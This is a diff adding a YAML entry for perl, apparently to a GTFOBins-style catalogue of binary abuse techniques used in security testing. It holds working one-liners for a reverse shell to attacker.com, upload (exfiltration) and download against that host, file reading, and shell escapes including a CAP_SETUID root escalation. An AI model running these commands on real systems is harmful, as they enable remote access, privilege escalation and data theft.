@@ -1,0 +1,50 @@
+---
+functions:
+  download:
+  - code: |-
+      perl -MIO::Socket::INET -e '$s=new IO::Socket::INET(PeerAddr=>"attacker.com",PeerPort=>80,Proto=>"tcp") or die; print $s "GET /path/to/input-file HTTP/1.1\r\nHost: attacker.com\r\nMetadata: true\r\nConnection: close\r\n\r\n"; open(my $fh, ">", "/path/to/output-file") or die; $in_content = 0; while (<$s>) { if ($in_content) { print $fh $_; } elsif ($_ eq "\r\n") { $in_content = 1; } } close($s); close($fh);'
+    contexts:
+      sudo:
+      unprivileged:
+    sender: http-server
+  file-read:
+  - code: |-
+      perl -ne print /path/to/input-file
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+  reverse-shell:
+  - code: |-
+      perl -e 'use Socket;$i="attacker.com";$p=12345;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+    contexts:
+      sudo:
+      unprivileged:
+    listener: tcp-server
+    tty: false
+  shell:
+  - code: |-
+      perl -e 'exec "/bin/sh"'
+    contexts:
+      capabilities:
+        code: |-
+          perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh"'
+        list:
+        - CAP_SETUID
+      sudo:
+      unprivileged:
+  - code: |-
+      PERL5OPT=-d PERL5DB='exec "/bin/sh"' perl /dev/null
+    comment: |-
+      The `/dev/null` part can be omitted, just use `Ctrl-D` in order to spawn the shell.
+    contexts:
+      sudo:
+      unprivileged:
+  upload:
+  - code: |-
+      perl -MIO::Socket::INET -e '$s = new IO::Socket::INET(PeerAddr=>"attacker.com", PeerPort=>80, Proto=>"tcp") or die;open(my $file, "<", "/path/to/input-file") or die;$content = join("", <$file>);close($file);$headers = "POST / HTTP/1.1\r\nHost: attacker.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " . length($content) . "\r\nConnection: close\r\n\r\n";print $s $headers . $content;while (<$s>) { }close($s);'
+    contexts:
+      sudo:
+      unprivileged:
+    receiver: http-server
+...
